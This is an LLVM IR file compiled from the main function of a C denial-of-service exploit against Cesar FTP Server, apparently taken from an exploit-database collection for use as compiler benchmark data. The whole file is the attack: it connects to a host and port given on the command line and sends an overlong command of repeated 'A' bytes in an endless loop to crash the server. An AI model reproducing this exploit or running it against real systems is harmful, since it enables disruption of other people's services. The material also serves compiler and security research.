; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_428.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_428.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [44 x i8] c"Cesar FTP Server Long Command DoS Exploit\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [51 x i8] c"lion lion#cnhonker.net, http://www.cnhonker.com\0D\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"%s <TargetHost> <TargetPort>\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"[-] ERROR: Create socket failed.\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"read\00", align 1
@recvbuf = common dso_local global i32 0, align 4
@BUFFSIZE = common dso_local global i32 0, align 4
@sendbuf = common dso_local global i8* null, align 8
@show = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [10 x i8] c"Send Buff\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i16, align 2
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = load i32, i32* @SIZE, align 4
  store i32 %10, i32* %9, align 4
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i32, i32* %3, align 4
  %14 = icmp slt i32 %13, 3
  br i1 %14, label %15, label %20

15:                                               ; preds = %2
  %16 = load i8**, i8*** %4, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0), i8* %18)
  br label %71

20:                                               ; preds = %2
  %21 = call i32 @MAKEWORD(i32 2, i32 2)
  %22 = call i32 @WSAStartup(i32 %21, i32* %5)
  %23 = call i64 (...) @create_socket()
  store i64 %23, i64* %8, align 8
  %24 = icmp eq i64 %23, 0
  br i1 %24, label %25, label %27

25:                                               ; preds = %20
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  br label %71

27:                                               ; preds = %20
  %28 = load i64, i64* %8, align 8
  %29 = load i8**, i8*** %4, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34)
  %36 = call i32 @client_connect(i64 %28, i8* %31, i32 %35)
  %37 = icmp ne i32 %36, 0
  br i1 %37, label %40, label %38

38:                                               ; preds = %27
  %39 = call i32 @exit(i32 -1) #3
  unreachable

40:                                               ; preds = %27
  %41 = load i64, i64* %8, align 8
  %42 = load i32, i32* @recvbuf, align 4
  %43 = load i32, i32* @BUFFSIZE, align 4
  %44 = call i32 @readbuf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i64 %41, i32 %42, i32 %43)
  %45 = load i8*, i8** @sendbuf, align 8
  %46 = load i32, i32* @BUFFSIZE, align 4
  %47 = call i32 @memset(i8* %45, i8 signext 0, i32 %46)
  %48 = load i8*, i8** @sendbuf, align 8
  %49 = load i32, i32* %9, align 4
  %50 = call i32 @memset(i8* %48, i8 signext 65, i32 %49)
  %51 = load i8*, i8** @sendbuf, align 8
  %52 = load i32, i32* %9, align 4
  %53 = sub nsw i32 %52, 2
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %51, i64 %54
  store i8 13, i8* %55, align 1
  %56 = load i8*, i8** @sendbuf, align 8
  %57 = load i32, i32* %9, align 4
  %58 = sub nsw i32 %57, 1
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %56, i64 %59
  store i8 10, i8* %60, align 1
  br label %61

61:                                               ; preds = %40, %61
  store i32 1, i32* @show, align 4
  %62 = load i64, i64* %8, align 8
  %63 = load i8*, i8** @sendbuf, align 8
  %64 = load i32, i32* %9, align 4
  %65 = call i32 @writebuf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i64 %62, i8* %63, i32 %64)
  %66 = load i64, i64* %8, align 8
  %67 = load i32, i32* @recvbuf, align 4
  %68 = load i32, i32* @BUFFSIZE, align 4
  %69 = call i32 @readbuf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i64 %66, i32 %67, i32 %68)
  %70 = call i32 @Sleep(i32 1000)
  br label %61

71:                                               ; preds = %25, %15
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i64 @create_socket(...) #1

declare dso_local i32 @client_connect(i64, i8*, i32) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @readbuf(i8*, i64, i32, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @writebuf(i8*, i64, i8*, i32) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
